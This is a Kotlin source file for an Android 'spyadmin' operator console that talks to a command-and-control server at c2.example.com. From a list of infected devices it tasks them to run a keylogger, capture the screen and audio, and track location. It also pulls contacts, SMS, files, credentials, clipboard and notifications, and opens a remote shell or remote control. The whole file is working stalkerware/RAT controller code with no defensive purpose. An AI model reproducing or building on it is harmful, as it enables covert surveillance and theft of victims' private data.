package com.spyadmin

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.gson.Gson
import okhttp3.*

class AdminActivity : AppCompatActivity() {

    private val gson = Gson()
    private val client = okhttp3.OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private lateinit var adapter: AgentAdapter
    private var selectedAgent: Agent? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)

        val rvAgents = findViewById<RecyclerView>(R.id.rvAgents).apply {
            layoutManager = LinearLayoutManager(this@AdminActivity)
            adapter = AgentAdapter(onClick = { agent ->
                selectedAgent = agent
                updateAgentDetails(agent)
            })
        }

        findViewById<Button>(R.id.btnRefresh).setOnClickListener { loadAgents() }
        findViewById<Button>(R.id.btnTaskKeylogger).setOnClickListener { sendTask("keylogger", mapOf("action" to "start")) }
        findViewById<Button>(R.id.btnTaskScreen).setOnClickListener { sendTask("screen", mapOf("action" to "capture")) }
        findViewById<Button>(R.id.btnTaskAudio).setOnClickListener { sendTask("audio", mapOf("action" to "start", "duration" to 30)) }
        findViewById<Button>(R.id.btnTaskLocation).setOnClickListener { sendTask("location", mapOf("action" to "get")) }
        findViewById<Button>(R.id.btnTaskContacts).setOnClickListener { sendTask("contacts", mapOf()) }
        findViewById<Button>(R.id.btnTaskSms).setOnClickListener { sendTask("sms", mapOf()) }
        findViewById<Button>(R.id.btnTaskFiles).setOnClickListener { sendTask("files", mapOf("action" to "list", "path" to "/sdcard")) }
        findViewById<Button>(R.id.btnTaskApps).setOnClickListener { sendTask("apps", mapOf("action" to "list")) }
        findViewById<Button>(R.id.btnTaskWifi).setOnClickListener { sendTask("wifi", mapOf("action" to "scan")) }
        findViewById<Button>(R.id.btnTaskShell).setOnClickListener { sendTask("shell", mapOf("command" to "id")) }
        findViewById<Button>(R.id.btnTaskCreds).setOnClickListener { sendTask("creds", mapOf()) }
        findViewById<Button>(R.id.btnTaskClipboard).setOnClickListener { sendTask("clipboard", mapOf("action" to "get")) }
        findViewById<Button>(R.id.btnTaskNotifications).setOnClickListener { sendTask("notifications", mapOf("action" to "dump")) }
        findViewById<Button>(R.id.btnRemoteControl).setOnClickListener { openRemoteControl() }

        loadAgents()
    }

    private fun loadAgents() {
        request("GET", "/api/agents") { resp ->
            val agents = gson.fromJson(resp, Array<Agent>::class.java).toList()
            runOnUiThread { adapter.submitList(agents) }
        }
    }

    private fun sendTask(capability: String, args: Map<String, Any>) {
        selectedAgent?.let { agent ->
            val payload = mapOf(
                "action" to "task",
                "agent_id" to agent.id,
                "capability" to capability,
                "args" to gson.toJson(args),
                "timeout" to 30
            )
            request("POST", "/api/command", payload) { resp ->
                runOnUiThread { Toast.makeText(this, "Task queued: $capability", Toast.LENGTH_SHORT).show() }
            }
        }
    }

    private fun openRemoteControl() {
        selectedAgent?.let { agent ->
            val intent = Intent(this, RemoteControlActivity::class.java).apply {
                putExtra("agent", gson.toJson(agent))
            }
            startActivity(intent)
        }
    }

    private fun request(method: String, endpoint: String, body: Any? = null, callback: (String) -> Unit) {
        val url = "https://c2.example.com:8443$endpoint"
        val requestBody = body?.let { okhttp3.RequestBody.create(gson.toJson(it), okhttp3.MediaType.get("application/json")) }
        val request = okhttp3.Request.Builder().url(url).method(method, requestBody).build()
        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: Exception) {
                runOnUiThread { Toast.makeText(this@AdminActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show() }
            }
            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.body?.string()?.let { callback(it) }
            }
        })
    }

    private fun updateAgentDetails(agent: Agent) {
        findViewById<TextView>(R.id.tvAgentId).text = "ID: ${agent.id}"
        findViewById<TextView>(R.id.tvHostname).text = "Device: ${agent.hostname}"
        findViewById<TextView>(R.id.tvOs).text = "OS: ${agent.os} ${agent.androidVersion} (SDK ${agent.sdk})"
        findViewById<TextView>(R.id.tvArch).text = "Arch: ${agent.arch}"
        findViewById<TextView>(R.id.tvRooted).text = "Rooted: ${agent.rooted}"
        findViewById<TextView>(R.id.tvLastSeen).text = "Last Seen: ${agent.lastSeen}"
    }
}

data class Agent(
    val id: String,
    val hostname: String,
    val os: String,
    val arch: String,
    val androidVersion: String,
    val sdk: Int,
    val rooted: Boolean,
    val lastSeen: String
)

class AgentAdapter(private val onClick: (Agent) -> Unit) :
    RecyclerView.Adapter<AgentAdapter.VH>() {

    private var agents = emptyList<Agent>()

    fun submitList(list: List<Agent>) { agents = list; notifyDataSetChanged() }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val view = LayoutInflater.from(parent.context).inflate(R.layout.item_agent, parent, false)
        return VH(view)
    }

    override fun onBindViewHolder(holder: VH, position: Int) {
        holder.bind(agents[position])
    }

    override fun getItemCount() = agents.size

    inner class VH(view: View) : RecyclerView.ViewHolder(view) {
        fun bind(agent: Agent) {
            itemView.tvName.text = agent.hostname
            itemView.tvId.text = agent.id.substring(0, 8)
            itemView.tvStatus.text = if (agent.rooted) "ROOTED" else "USER"
            itemView.setOnClickListener { onClick(agent) }
        }
    }
}